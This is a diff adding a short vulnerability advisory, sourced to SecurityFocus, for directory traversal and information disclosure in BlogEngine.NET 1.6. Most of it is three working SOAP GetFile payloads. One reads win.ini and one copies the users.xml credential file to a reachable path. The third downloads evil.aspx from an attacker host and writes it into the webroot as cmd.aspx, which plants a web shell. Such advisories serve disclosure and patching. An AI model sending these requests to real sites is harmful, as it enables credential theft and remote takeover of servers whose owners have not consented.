@@ -1,0 +1,24 @@
+source: http://www.securityfocus.com/bid/45681/info
+
+BlogEngine.NET is prone to a directory-traversal vulnerability and an information-disclosure vulnerability because the application fails to sufficiently sanitize user-supplied input.
+
+Exploiting the issues may allow an attacker to obtain sensitive information and upload arbitrary files to the webserver that could aid in further attacks.
+
+BlogEngine.NET 1.6 is vulnerable. 
+
+The following example SOAP requests are available:
+
+1. <GetFile xmlns="http://dotnetblogengine.net/">
+<source>c:\Windows\win.ini</source>
+<destination>string</destination>
+</GetFile>
+
+2. <GetFile xmlns="http://dotnetblogengine.net/">
+<source>c:\webroot\blog\App_Data\users.xml</source>
+<destination>../../aa.txt</destination>
+</GetFile>
+
+3. <GetFile xmlns="http://dotnetblogengine.net/">
+<source>http://attacker/evil.aspx</source>
+<destination>/../../cmd.aspx</destination>
+</GetFile> 
